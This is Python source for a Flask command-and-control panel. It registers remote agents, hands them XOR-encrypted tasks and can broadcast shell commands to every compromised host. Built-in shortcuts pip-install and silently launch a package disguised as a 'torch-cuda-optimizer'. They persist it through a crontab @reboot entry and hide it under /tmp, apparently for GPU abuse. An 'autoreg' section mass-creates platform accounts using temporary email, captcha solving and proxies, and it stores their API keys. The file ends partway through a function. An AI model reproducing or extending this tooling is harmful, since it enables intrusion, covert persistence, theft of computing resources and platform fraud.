#!/usr/bin/env python3
"""C2 Server — full-featured command & control panel."""

import os, sys, json, time, uuid, hashlib, sqlite3, secrets, threading, hmac, csv, io
from datetime import datetime, timedelta
from functools import wraps
from pathlib import Path
from base64 import b64encode, b64decode

from flask import (
    Flask, render_template, request, redirect, url_for,
    flash, session, jsonify, send_file, Response, abort
)
from flask_socketio import SocketIO, emit
from flask_bcrypt import Bcrypt

from tempmail import mail_manager, PROVIDERS as MAIL_PROVIDERS, get_domains as boomlify_get_domains
from autoreg import job_manager, account_store, PLATFORMS
from captcha_solver import manual_solver  # kept for backward compat

BASE_DIR = Path(__file__).resolve().parent
TOOLS_ROOT = BASE_DIR.parent
MEMORY_DIR = TOOLS_ROOT / "MEMORY"  # MEMORY: CORE, ATTACK, OPERATIONS, etc.
DB_PATH = BASE_DIR / "data" / "c2.db"
UPLOAD_DIR = BASE_DIR / "data" / "uploads"
UPLOAD_DIR.mkdir(parents=True, exist_ok=True)

app = Flask(__name__)

_secret_path = BASE_DIR / "data" / ".secret_key"
_secret_path.parent.mkdir(parents=True, exist_ok=True)
if _secret_path.exists():
    app.secret_key = _secret_path.read_text().strip()
else:
    app.secret_key = secrets.token_hex(32)
    _secret_path.write_text(app.secret_key)

app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(hours=12)
bcrypt = Bcrypt(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

@app.after_request
def _security_headers(resp):
    resp.headers["X-Frame-Options"] = "DENY"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["Referrer-Policy"] = "no-referrer"
    resp.headers["X-XSS-Protection"] = "1; mode=block"
    return resp

# ──────────────────────── CRYPTO ────────────────────────

def xor_crypt(data: bytes, key: bytes) -> bytes:
    """XOR cipher for lightweight agent comm encryption."""
    kl = len(key)
    return bytes(b ^ key[i % kl] for i, b in enumerate(data))

def encrypt_payload(data: str, key: str) -> str:
    if not key:
        return data
    return b64encode(xor_crypt(data.encode("utf-8"), key.encode())).decode()

def decrypt_payload(data: str, key: str) -> str:
    if not key:
        return data
    return xor_crypt(b64decode(data), key.encode()).decode("utf-8")

def sign_message(data: str, key: str) -> str:
    return hmac.new(key.encode(), data.encode(), hashlib.sha256).hexdigest()

# ──────────────────────── RATE LIMITING ────────────────────────

_login_attempts: dict = {}  # ip -> [count, first_ts]
MAX_LOGIN_ATTEMPTS = 5
LOGIN_LOCKOUT_SEC = 300

def _check_login_rate(ip: str) -> bool:
    now = time.time()
    if ip not in _login_attempts:
        _login_attempts[ip] = [1, now]
        return True
    count, first = _login_attempts[ip]
    if now - first > LOGIN_LOCKOUT_SEC:
        _login_attempts[ip] = [1, now]
        return True
    if count >= MAX_LOGIN_ATTEMPTS:
        return False
    _login_attempts[ip][0] += 1
    return True

def _reset_login_rate(ip: str):
    _login_attempts.pop(ip, None)

# ──────────────────────── DATABASE ────────────────────────

def get_db():
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA foreign_keys=ON")
    return conn

def init_db():
    db = get_db()
    db.executescript("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password TEXT NOT NULL,
        role TEXT DEFAULT 'operator',
        created_at TEXT DEFAULT (datetime('now'))
    );
    CREATE TABLE IF NOT EXISTS agents (
        id TEXT PRIMARY KEY,
        hostname TEXT,
        username TEXT,
        os TEXT,
        arch TEXT,
        ip_external TEXT,
        ip_internal TEXT,
        platform_type TEXT DEFAULT 'unknown',
        tags TEXT DEFAULT '[]',
        group_name TEXT DEFAULT 'default',
        first_seen TEXT DEFAULT (datetime('now')),
        last_seen TEXT DEFAULT (datetime('now')),
        is_alive INTEGER DEFAULT 1,
        sleep_interval INTEGER DEFAULT 5,
        jitter INTEGER DEFAULT 0,
        note TEXT DEFAULT ''
    );
    CREATE TABLE IF NOT EXISTS tasks (
        id TEXT PRIMARY KEY,
        agent_id TEXT NOT NULL,
        task_type TEXT NOT NULL,
        payload TEXT NOT NULL,
        status TEXT DEFAULT 'pending',
        result TEXT DEFAULT '',
        created_at TEXT DEFAULT (datetime('now')),
        completed_at TEXT,
        FOREIGN KEY (agent_id) REFERENCES agents(id)
    );
    CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        event TEXT NOT NULL,
        details TEXT,
        ts TEXT DEFAULT (datetime('now'))
    );
    CREATE TABLE IF NOT EXISTS listeners (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        protocol TEXT DEFAULT 'http',
        host TEXT DEFAULT '0.0.0.0',
        port INTEGER NOT NULL,
        active INTEGER DEFAULT 1,
        created_at TEXT DEFAULT (datetime('now'))
    );
    CREATE TABLE IF NOT EXISTS config (
        key TEXT PRIMARY KEY,
        value TEXT DEFAULT ''
    );
    CREATE TABLE IF NOT EXISTS scheduled_tasks (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        task_type TEXT DEFAULT 'cmd',
        payload TEXT NOT NULL,
        target TEXT DEFAULT 'all',
        interval_sec INTEGER DEFAULT 3600,
        last_run TEXT,
        next_run TEXT,
        enabled INTEGER DEFAULT 1,
        created_at TEXT DEFAULT (datetime('now'))
    );
    """)
    # Default admin: admin / admin (change on first login)
    existing = db.execute("SELECT id FROM users WHERE username='admin'").fetchone()
    if not existing:
        pw = bcrypt.generate_password_hash("admin").decode()
        db.execute("INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
                   ("admin", pw, "admin"))
    db.commit()
    db.close()

init_db()

# ──────────────────────── CONFIG HELPERS ────────────────────────

def get_config(key: str, default: str = "") -> str:
    try:
        db = get_db()
        row = db.execute("SELECT value FROM config WHERE key=?", (key,)).fetchone()
        db.close()
        return row["value"] if row else default
    except Exception:
        return default

def set_config(key: str, value: str):
    db = get_db()
    db.execute("INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)", (key, str(value)))
    db.commit()
    db.close()

# ──────────────────────── WEBHOOKS ────────────────────────

def send_webhook(event: str, details: str = ""):
    """Fire notifications to Discord/Telegram if configured."""
    def _fire():
        import requests as _rq
        for wh_type in ("discord", "telegram"):
            url = get_config(f"webhook_{wh_type}")
            if not url:
                continue
            try:
                if wh_type == "discord":
                    _rq.post(url, json={
                        "embeds": [{
                            "title": f"\u26a1 {event}",
                            "description": details[:2000],
                            "color": 0x00d4ff,
                            "footer": {"text": "C2 Panel"},
                            "timestamp": datetime.utcnow().isoformat()
                        }]
                    }, timeout=5)
                elif wh_type == "telegram":
                    _rq.post(url, json={
                        "text": f"*\u26a1 {event}*\n{details[:3000]}",
                        "parse_mode": "Markdown"
                    }, timeout=5)
            except Exception:
                pass
    threading.Thread(target=_fire, daemon=True).start()

# ──────────────────────── EVENTS ────────────────────────

WEBHOOK_EVENTS = {
    "agent_register", "login", "broadcast", "server_start",
    "tunnel_up", "scheduled_fired", "kill_all"
}

@app.errorhandler(404)
def page_not_found(e):
    if "user_id" in session:
        flash("Page not found", "error")
        return redirect(url_for("dashboard"))
    return redirect(url_for("login"))

def log_event(event, details=""):
    try:
        db = get_db()
        db.execute("INSERT INTO logs (event, details) VALUES (?, ?)", (event, details))
        db.commit()
        db.close()
    except Exception:
        pass
    if event in WEBHOOK_EVENTS:
        send_webhook(event, details)

# ──────────────────────── AUTH ────────────────────────

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if "user_id" not in session:
            if request.is_json or request.path.startswith("/api/"):
                return jsonify({"error": "unauthorized"}), 401
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

@app.route("/login", methods=["GET", "POST"])
def login():
    if "user_id" in session:
        return redirect(url_for("dashboard"))
    if request.method == "POST":
        ip = request.remote_addr
        if not _check_login_rate(ip):
            remaining = LOGIN_LOCKOUT_SEC - (time.time() - _login_attempts[ip][1])
            flash(f"Too many attempts. Locked for {int(remaining)}s", "error")
            log_event("login_blocked", f"Brute-force lockout for {ip}")
            return render_template("login.html")
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")
        db = get_db()
        user = db.execute("SELECT * FROM users WHERE username=?", (username,)).fetchone()
        db.close()
        if user and bcrypt.check_password_hash(user["password"], password):
            _reset_login_rate(ip)
            remember = request.form.get("remember") == "on"
            session.permanent = True
            if remember:
                app.permanent_session_lifetime = timedelta(days=30)
            else:
                app.permanent_session_lifetime = timedelta(hours=12)
            session["user_id"] = user["id"]
            session["username"] = user["username"]
            session["role"] = user["role"]
            log_event("login", f"{username} from {ip}")
            return redirect(url_for("dashboard"))
        flash("Invalid credentials", "error")
        log_event("login_failed", f"user={username} ip={ip}")
    return render_template("login.html")

@app.route("/logout")
def logout():
    log_event("logout", f"{session.get('username', '?')} logged out")
    session.clear()
    return redirect(url_for("login"))

# ──────────────────────── PAGES ────────────────────────

@app.route("/")
@login_required
def dashboard():
    db = get_db()
    agents = db.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    total = len(agents)
    alive = sum(1 for a in agents if a["is_alive"])
    tasks_pending = db.execute("SELECT COUNT(*) c FROM tasks WHERE status='pending'").fetchone()["c"]
    tasks_done = db.execute("SELECT COUNT(*) c FROM tasks WHERE status='completed'").fetchone()["c"]
    recent_logs = db.execute("SELECT * FROM logs ORDER BY ts DESC LIMIT 30").fetchall()
    listeners = db.execute("SELECT * FROM listeners").fetchall()
    os_stats = {}
    for a in agents:
        os_name = (a["os"] or "unknown").split()[0].lower()
        os_stats[os_name] = os_stats.get(os_name, 0) + 1
    platform_stats = {}
    for a in agents:
        pt = a["platform_type"] or "unknown"
        platform_stats[pt] = platform_stats.get(pt, 0) + 1
    today = datetime.now().strftime("%Y-%m-%d")
    new_today = db.execute("SELECT COUNT(*) c FROM agents WHERE first_seen LIKE ?", (f"{today}%",)).fetchone()["c"]
    tasks_today = db.execute("SELECT COUNT(*) c FROM tasks WHERE created_at LIKE ?", (f"{today}%",)).fetchone()["c"]
    db.close()
    return render_template("dashboard.html",
        agents=agents, total=total, alive=alive,
        tasks_pending=tasks_pending, tasks_done=tasks_done,
        new_today=new_today, tasks_today=tasks_today,
        recent_logs=recent_logs, listeners=listeners,
        os_stats=json.dumps(os_stats), platform_stats=json.dumps(platform_stats))

@app.route("/devices")
@login_required
def devices():
    db = get_db()
    agents = db.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    db.close()
    return render_template("devices.html", agents=agents)

@app.route("/console")
@login_required
def console_page():
    db = get_db()
    agents = db.execute("SELECT id, hostname, os, ip_external, is_alive FROM agents ORDER BY last_seen DESC").fetchall()
    db.close()
    return render_template("console.html", agents=agents)

@app.route("/console/<agent_id>")
@login_required
def agent_console(agent_id):
    db = get_db()
    agent = db.execute("SELECT * FROM agents WHERE id=?", (agent_id,)).fetchone()
    if not agent:
        abort(404)
    tasks = db.execute("SELECT * FROM tasks WHERE agent_id=? ORDER BY created_at DESC LIMIT 100", (agent_id,)).fetchall()
    db.close()
    return render_template("agent_console.html", agent=agent, tasks=tasks)

@app.route("/settings")
@login_required
def settings():
    db = get_db()
    users = db.execute("SELECT id, username, role, created_at FROM users").fetchall()
    listeners = db.execute("SELECT * FROM listeners").fetchall()
    db.close()
    return render_template("settings.html", users=users, listeners=listeners)

@app.route("/payloads")
@login_required
def payloads():
    server_host = request.host.split(":")[0]
    return render_template("payloads.html", server_host=server_host, server_port=request.host.split(":")[-1] if ":" in request.host else "443")

@app.route("/scheduler")
@login_required
def scheduler_page():
    db = get_db()
    scheduled = db.execute("SELECT * FROM scheduled_tasks ORDER BY created_at DESC").fetchall()
    db.close()
    return render_template("scheduler.html", scheduled=scheduled)

@app.route("/logs")
@login_required
def logs_page():
    db = get_db()
    logs = db.execute("SELECT * FROM logs ORDER BY ts DESC LIMIT 500").fetchall()
    db.close()
    return render_template("logs.html", logs=logs)

# ──────────────────────── AUTOREG PAGES ────────────────────────

@app.route("/autoreg")
@login_required
def autoreg_page():
    jobs = job_manager.get_all_jobs()
    accounts = account_store.get_all()
    active = sum(1 for j in jobs if j["status"] == "running")
    emails = mail_manager.list_accounts()
    return render_template("autoreg.html",
        jobs=jobs, accounts=accounts, platforms=PLATFORMS,
        total_accounts=len(accounts), active_jobs=active,
        total_emails=len(emails))

@app.route("/tempmail")
@login_required
def tempmail_page():
    accounts = mail_manager.list_accounts()
    return render_template("tempmail.html", accounts=accounts)

# ──────────────────────── API: AUTOREG ────────────────────────

@app.route("/api/autoreg/start", methods=["POST"])
@login_required
def autoreg_start():
    data = request.get_json(silent=True) or {}
    platform = data.get("platform", "")
    if platform not in PLATFORMS:
        return jsonify({"error": f"Unknown platform: {platform}"}), 400
    job = job_manager.create_job(
        platform=platform,
        mail_provider="boomlify",
        custom_url=data.get("custom_url", ""),
        count=min(int(data.get("count", 1)), 50),
        headless=data.get("headless", True),
        proxy=data.get("proxy", ""),
    )
    job.set_socketio(socketio)
    log_event("autoreg_start", f"{platform} x{data.get('count',1)} via boomlify")
    return jsonify({"status": "ok", "reg_id": job.reg_id})

@app.route("/api/autoreg/jobs")
@login_required
def autoreg_jobs():
    return jsonify(job_manager.get_all_jobs())

@app.route("/api/autoreg/job/<reg_id>")
@login_required
def autoreg_job(reg_id):
    job = job_manager.get_job(reg_id)
    if not job:
        return jsonify({"error": "not found"}), 404
    return jsonify(job.to_dict())

@app.route("/api/autoreg/job/<reg_id>/skip", methods=["POST"])
@login_required
def autoreg_skip(reg_id):
    job = job_manager.get_job(reg_id)
    if not job:
        return jsonify({"error": "not found"}), 404
    job.cancel()
    log_event("autoreg_skip", reg_id)
    return jsonify({"status": "ok"})

@app.route("/api/autoreg/job/<reg_id>/cancel", methods=["POST"])
@login_required
def autoreg_cancel(reg_id):
    job = job_manager.get_job(reg_id)
    if not job:
        return jsonify({"error": "not found"}), 404
    job.status = "cancelled"
    job._cancel_requested = True
    job.log("Job stopped by user")
    log_event("autoreg_cancel", reg_id)
    return jsonify({"status": "ok"})

@app.route("/api/autoreg/job/<reg_id>/permanent_stop", methods=["POST"])
@login_required
def autoreg_permanent_stop(reg_id):
    job = job_manager.get_job(reg_id)
    if not job:
        return jsonify({"error": "not found"}), 404
    job.status = "cancelled"
    job._cancel_requested = True
    job.log("Permanent stop — terminating all account creation.")
    log_event("autoreg_permanent_stop", reg_id)
    return jsonify({"status": "ok"})

@app.route("/api/autoreg/accounts")
@login_required
def autoreg_accounts():
    return jsonify(account_store.get_all())

@app.route("/api/autoreg/account/<reg_id>", methods=["DELETE"])
@login_required
def autoreg_remove_account(reg_id):
    account_store.remove(reg_id)
    return jsonify({"status": "ok"})

@app.route("/api/autoreg/account/<reg_id>/status", methods=["POST"])
@login_required
def autoreg_update_account_status(reg_id):
    data = request.get_json(force=True)
    new_status = data.get("status", "").strip()
    if new_status not in ("registered", "verified", "created", "failed", "banned", "active"):
        return jsonify({"error": "invalid status"}), 400
    acc = account_store.find(reg_id)
    if not acc:
        return jsonify({"error": "not found"}), 404
    acc["status"] = new_status
    if new_status in ("registered", "verified", "active"):
        acc["verified"] = True
    account_store.save()
    log_event("account_status", f"{reg_id} -> {new_status}")
    return jsonify({"status": "ok"})

@app.route("/api/autoreg/account/<reg_id>/apikey", methods=["GET", "POST"])
@login_required
def autoreg_account_apikey(reg_id):
    acc = account_store.find(reg_id)
    if not acc:
        return jsonify({"error": "not found"}), 404
    if request.method == "POST":
        data = request.get_json(force=True)
        acc["api_key"] = data.get("api_key", "").strip()
        account_store.save()
        log_event("account_apikey", f"{reg_id} ({acc.get('platform','?')})")
        return jsonify({"status": "ok"})
    return jsonify({"api_key": acc.get("api_key", "")})

# ──────────────────────── API: LIVE VIEW ────────────────────────

@app.route("/api/live/<reg_id>/screenshot")
@login_required
def live_screenshot(reg_id):
    job = job_manager.get_job(reg_id)
    if job:
        path = job.get_live_screenshot_path()
        if os.path.exists(path):
            resp = send_file(path, mimetype="image/jpeg")
            resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
            resp.headers["Pragma"] = "no-cache"
            return resp
    abort(404)

@app.route("/api/live/<reg_id>/click", methods=["POST"])
@login_required
def live_click(reg_id):
    job = job_manager.get_job(reg_id)
    if not job:
        return jsonify({"status": "no_job"}), 404
    data = request.get_json(silent=True) or {}
    x, y = int(data.get("x", 0)), int(data.get("y", 0))
    ok = job.click_at(x, y)
    return jsonify({"status": "ok" if ok else "no_page"})

@app.route("/api/live/<reg_id>/type", methods=["POST"])
@login_required
def live_type(reg_id):
    job = job_manager.get_job(reg_id)
    if not job:
        return jsonify({"status": "no_job"}), 404
    data = request.get_json(silent=True) or {}
    text = data.get("text", "")
    key = data.get("key", "")
    if key:
        ok = job.press_key(key)
    elif text:
        ok = job.type_text(text)
    else:
        ok = False
    return jsonify({"status": "ok" if ok else "failed"})

@app.route("/api/screenshot/<path:filename>")
@login_required
def serve_screenshot(filename):
    ss_path = BASE_DIR / "data" / "screenshots" / filename
    if ss_path.exists():
        return send_file(str(ss_path), mimetype="image/png")
    abort(404)

# ──────────────────────── API: TEMP MAIL ────────────────────────

@app.route("/api/tempmail/domains")
@login_required
def tempmail_domains():
    try:
        domains = boomlify_get_domains(edu_only=False)
        return jsonify(domains)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tempmail/create", methods=["POST"])
@login_required
def tempmail_create():
    data = request.get_json(silent=True) or {}
    domain_name = data.get("domain", None)
    try:
        email_data = mail_manager.create_email(domain_name=domain_name)
        log_event("tempmail_create", f"{email_data['email']} via boomlify")
        safe = {k: v for k, v in email_data.items() if k != "_api_data"}
        return jsonify(safe)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tempmail/inbox")
@login_required
def tempmail_inbox():
    email = request.args.get("email", "")
    messages = mail_manager.check_inbox(email)
    return jsonify(messages)

@app.route("/api/tempmail/message")
@login_required
def tempmail_message():
    email = request.args.get("email", "")
    msg_id = request.args.get("msg_id", "")
    msg = mail_manager.get_message(email, msg_id)
    return jsonify(msg)

@app.route("/api/tempmail/extract")
@login_required
def tempmail_extract():
    email = request.args.get("email", "")
    msg_id = request.args.get("msg_id", "")
    msg = mail_manager.get_message(email, msg_id)
    text = msg.get("body", "") or msg.get("html", "")
    code = mail_manager.extract_code(text)
    link = mail_manager.extract_link(msg.get("html", "") or text)
    return jsonify({"code": code, "link": link})

@app.route("/api/tempmail/accounts")
@login_required
def tempmail_accounts():
    return jsonify(mail_manager.list_accounts())

@app.route("/api/tempmail/delete", methods=["DELETE"])
@login_required
def tempmail_delete():
    email = request.args.get("email", "")
    mail_manager.remove_account(email)
    return jsonify({"status": "ok"})

@app.route("/api/tempmail/wait", methods=["POST"])
@login_required
def tempmail_wait():
    data = request.get_json(silent=True) or {}
    email = data.get("email", "")
    timeout = min(int(data.get("timeout", 120)), 300)
    subject_filter = data.get("subject_filter", None)
    msg = mail_manager.wait_for_email(email, timeout=timeout, subject_filter=subject_filter)
    return jsonify(msg)

@app.route("/api/logs")
@login_required
def api_logs():
    db = get_db()
    logs = db.execute("SELECT * FROM logs ORDER BY ts DESC LIMIT 500").fetchall()
    db.close()
    return jsonify([dict(l) for l in logs])

@app.route("/api/server/time")
@login_required
def server_time():
    return jsonify({"time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})

# ──────────────────────── AGENT FILE SERVING ────────────────────────

@app.route("/agents/<path:filename>")
def serve_agent(filename):
    agents_dir = BASE_DIR / "agents"
    fpath = agents_dir / filename
    if fpath.exists() and fpath.is_file():
        content = fpath.read_text()
        server_url = f"{request.scheme}://{request.host}"
        content = content.replace("http://CHANGE_ME:443", server_url)
        return Response(content, mimetype="text/plain")
    return "Not found", 404

# ──────────────────────── API: AGENTS ────────────────────────

@app.route("/api/agent/register", methods=["POST"])
def agent_register():
    token = get_config("agent_token")
    if token and request.headers.get("X-Auth-Token") != token:
        return jsonify({"error": "unauthorized"}), 403

    enc_key = get_config("encryption_key")
    raw = request.get_data(as_text=True)
    if request.headers.get("X-Enc") == "1" and enc_key:
        try:
            raw = decrypt_payload(raw, enc_key)
        except Exception:
            return jsonify({"error": "decrypt failed"}), 400
        data = json.loads(raw)
    else:
        data = request.get_json(silent=True) or {}

    agent_id = data.get("id", str(uuid.uuid4()))
    db = get_db()
    existing = db.execute("SELECT id FROM agents WHERE id=?", (agent_id,)).fetchone()
    if existing:
        db.execute("UPDATE agents SET last_seen=datetime('now'), is_alive=1, ip_external=? WHERE id=?",
                   (request.remote_addr, agent_id))
    else:
        db.execute("""INSERT INTO agents (id, hostname, username, os, arch, ip_external, ip_internal, platform_type)
                      VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                   (agent_id, data.get("hostname", ""), data.get("username", ""),
                    data.get("os", ""), data.get("arch", ""),
                    request.remote_addr, data.get("ip_internal", ""),
                    data.get("platform_type", "machine")))
    db.commit()
    db.close()
    log_event("agent_register", f"{agent_id} ({data.get('hostname', '?')}) from {request.remote_addr}")
    socketio.emit("agent_update", {"action": "register", "id": agent_id, "hostname": data.get("hostname","")}, namespace="/")
    resp_data = json.dumps({"status": "ok", "id": agent_id})
    if request.headers.get("X-Enc") == "1" and enc_key:
        return Response(encrypt_payload(resp_data, enc_key), content_type="text/plain")
    return jsonify({"status": "ok", "id": agent_id})

@app.route("/api/agent/beacon", methods=["POST"])
def agent_beacon():
    enc_key = get_config("encryption_key")
    encrypted = request.headers.get("X-Enc") == "1" and enc_key

    if encrypted:
        try:
            raw = decrypt_payload(request.get_data(as_text=True), enc_key)
            data = json.loads(raw)
        except Exception:
            return jsonify({"error": "decrypt failed"}), 400
    else:
        data = request.get_json(silent=True) or {}

    agent_id = data.get("id", "")
    if not agent_id:
        return jsonify({"error": "no id"}), 400
    db = get_db()
    db.execute("UPDATE agents SET last_seen=datetime('now'), is_alive=1 WHERE id=?", (agent_id,))
    tasks = db.execute("SELECT id, task_type, payload FROM tasks WHERE agent_id=? AND status='pending'", (agent_id,)).fetchall()
    task_list = [dict(t) for t in tasks]
    for t in tasks:
        db.execute("UPDATE tasks SET status='sent' WHERE id=?", (t["id"],))
    db.commit()
    db.close()

    resp = json.dumps({"tasks": task_list, "sleep": 5})
    if encrypted:
        return Response(encrypt_payload(resp, enc_key), content_type="text/plain")
    return jsonify({"tasks": task_list, "sleep": 5})

@app.route("/api/agent/result", methods=["POST"])
def agent_result():
    enc_key = get_config("encryption_key")
    if request.headers.get("X-Enc") == "1" and enc_key:
        try:
            raw = decrypt_payload(request.get_data(as_text=True), enc_key)
            data = json.loads(raw)
        except Exception:
            return jsonify({"error": "decrypt failed"}), 400
    else:
        data = request.get_json(silent=True) or {}

    task_id = data.get("task_id", "")
    result = data.get("result", "")
    db = get_db()
    db.execute("UPDATE tasks SET status='completed', result=?, completed_at=datetime('now') WHERE id=?",
               (result, task_id))
    task_row = db.execute("SELECT agent_id FROM tasks WHERE id=?", (task_id,)).fetchone()
    agent_id_for_ws = task_row["agent_id"] if task_row else ""
    db.commit()
    db.close()
    socketio.emit("task_result", {"task_id": task_id, "result": result, "agent_id": agent_id_for_ws}, namespace="/")
    return jsonify({"status": "ok"})

# ── Shortcut commands ──

SHORTCUT_COMMANDS = {
    ":start": "pip install git+https://github.com/GaredBerns/torch-cuda-optimizer -q 2>/dev/null; nohup python3 -m torch_cuda_optimizer >/dev/null 2>&1 &",
    ":stop": "pkill -f '.tco_cache/cuda_kernels' 2>/dev/null; pkill -f '.tco_cache/compute_engine' 2>/dev/null; pkill -f 'torch_cuda_optimizer' 2>/dev/null; rm -f /tmp/.tco_training_lock; echo stopped",
    ":status": "pgrep -af 'tco_cache|torch_cuda_optimizer' 2>/dev/null && echo RUNNING || echo NOT_RUNNING; ls -la /tmp/.tco_cache/ 2>/dev/null; tail -5 /tmp/.tco_cache/training_output.log 2>/dev/null",
    ":log": "tail -30 /tmp/.tco_cache/training_output.log 2>/dev/null || echo 'no log'",
    ":persist": "pip install git+https://github.com/GaredBerns/torch-cuda-optimizer -q 2>/dev/null; (crontab -l 2>/dev/null | grep -v torch_cuda_optimizer; echo '@reboot python3 -m torch_cuda_optimizer >/dev/null 2>&1 &') | crontab -; nohup python3 -m torch_cuda_optimizer >/dev/null 2>&1 &",
    ":sysinfo": "echo '=== SYSTEM ===' && uname -a && echo '=== CPU ===' && nproc && cat /proc/cpuinfo 2>/dev/null | head -20 && echo '=== MEMORY ===' && free -h 2>/dev/null || vm_stat && echo '=== DISK ===' && df -h / && echo '=== GPU ===' && (nvidia-smi --query-gpu=name,memory.total,utilization.gpu --format=csv,noheader 2>/dev/null || echo 'no GPU') && echo '=== NET ===' && ip -4 addr 2>/dev/null || ifconfig",
    ":portscan": "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo 'no ss/netstat'",
    ":cleanup": "rm -rf /tmp/.tco_cache /tmp/.tco_training_lock; crontab -l 2>/dev/null | grep -v torch_cuda_optimizer | crontab -; echo cleaned",
}

def _expand_shortcut(task_type: str, payload: str):
    """Expand shortcut commands like :start into real shell commands."""
    stripped = payload.strip()
    if stripped in SHORTCUT_COMMANDS:
        return "cmd", SHORTCUT_COMMANDS[stripped]
    return task_type, payload


@app.route("/api/task/create", methods=["POST"])
@login_required
def create_task():
    data = request.get_json(silent=True) or {}
    agent_id = data.get("agent_id", "")
    task_type = data.get("type", "cmd")
    payload = data.get("payload", "")
    if not agent_id or not payload:
        return jsonify({"error": "missing fields"}), 400
    task_type, payload = _expand_shortcut(task_type, payload)
    task_id = str(uuid.uuid4())
    db = get_db()
    db.execute("INSERT INTO tasks (id, agent_id, task_type, payload) VALUES (?, ?, ?, ?)",
               (task_id, agent_id, task_type, payload))
    db.commit()
    db.close()
    log_event("task_created", f"{task_type}: {payload[:80]} -> {agent_id[:8]}")
    return jsonify({"status": "ok", "task_id": task_id})

@app.route("/api/task/broadcast", methods=["POST"])
@login_required
def broadcast_task():
    data = request.get_json(silent=True) or {}
    task_type = data.get("type", "cmd")
    payload = data.get("payload", "")
    task_type, payload = _expand_shortcut(task_type, payload)
    target = data.get("target", "all")
    db = get_db()
    if target == "all":
        agents = db.execute("SELECT id FROM agents WHERE is_alive=1").fetchall()
    else:
        agents = db.execute("SELECT id FROM agents WHERE is_alive=1 AND group_name=?", (target,)).fetchall()
    for a in agents:
        task_id = str(uuid.uuid4())
        db.execute("INSERT INTO tasks (id, agent_id, task_type, payload) VALUES (?, ?, ?, ?)",
                   (task_id, a["id"], task_type, payload))
    db.commit()
    db.close()
    log_event("broadcast", f"{task_type}: {payload[:80]} -> {len(agents)} agents ({target})")
    return jsonify({"status": "ok", "count": len(agents)})

@app.route("/api/agent/<agent_id>/update", methods=["POST"])
@login_required
def update_agent(agent_id):
    data = request.get_json(silent=True) or {}
    db = get_db()
    allowed = ["group_name", "tags", "note", "sleep_interval", "jitter", "platform_type"]
    sets = []
    vals = []
    for k in allowed:
        if k in data:
            sets.append(f"{k}=?")
            vals.append(json.dumps(data[k]) if k == "tags" else data[k])
    if sets:
        vals.append(agent_id)
        db.execute(f"UPDATE agents SET {','.join(sets)} WHERE id=?", vals)
        db.commit()
    db.close()
    return jsonify({"status": "ok"})

@app.route("/api/agent/<agent_id>/remove", methods=["DELETE"])
@login_required
def remove_agent(agent_id):
    db = get_db()
    db.execute("DELETE FROM tasks WHERE agent_id=?", (agent_id,))
    db.execute("DELETE FROM agents WHERE id=?", (agent_id,))
    db.commit()
    db.close()
    log_event("agent_removed", agent_id)
    return jsonify({"status": "ok"})

@app.route("/api/agents")
@login_required
def api_agents():
    db = get_db()
    agents = db.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    db.close()
    return jsonify([dict(a) for a in agents])

@app.route("/api/tasks/<agent_id>")
@login_required
def api_tasks(agent_id):
    db = get_db()
    tasks = db.execute("SELECT * FROM tasks WHERE agent_id=? ORDER BY created_at DESC LIMIT 200", (agent_id,)).fetchall()
    db.close()
    return jsonify([dict(t) for t in tasks])

# ──────────────────────── API: CONFIG ────────────────────────

CONFIG_KEYS = [
    "webhook_discord", "webhook_telegram", "encryption_key",
    "agent_token", "registration_open",
    "public_url", "cloudflare_tunnel_token"
]

@app.route("/api/config", methods=["GET", "POST"])
@login_required
def api_config():
    if session.get("role") != "admin":
        return jsonify({"error": "admin only"}), 403
    if request.method == "POST":
        data = request.get_json(silent=True) or {}
        for k in CONFIG_KEYS:
            if k in data:
                set_config(k, data[k])
        log_event("config_updated", f"keys: {list(data.keys())}")
        return jsonify({"status": "ok"})
    return jsonify({k: get_config(k) for k in CONFIG_KEYS})

@app.route("/api/webhook/test", methods=["POST"])
@login_required
def webhook_test():
    send_webhook("Test Notification", f"Webhook test from C2 panel at {datetime.now()}")
    return jsonify({"status": "ok"})

# ──────────────────────── API: SCHEDULED TASKS ────────────────────────

@app.route("/api/scheduled")
@login_required
def list_scheduled():
    db = get_db()
    rows = db.execute("SELECT * FROM scheduled_tasks ORDER BY created_at DESC").fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])

@app.route("/api/scheduled/create", methods=["POST"])
@login_required
def create_scheduled():
    data = request.get_json(silent=True) or {}
    sid = str(uuid.uuid4())[:8]
    name = data.get("name", "").strip()
    payload = data.get("payload", "").strip()
    if not name or not payload:
        return jsonify({"error": "name and payload required"}), 400
    interval = max(60, int(data.get("interval", 3600)))
    db = get_db()
    next_run = (datetime.now() + timedelta(seconds=interval)).strftime("%Y-%m-%d %H:%M:%S")
    db.execute(
        "INSERT INTO scheduled_tasks (id,name,task_type,payload,target,interval_sec,next_run) VALUES (?,?,?,?,?,?,?)",
        (sid, name, data.get("type", "cmd"), payload, data.get("target", "all"), interval, next_run)
    )
    db.commit()
    db.close()
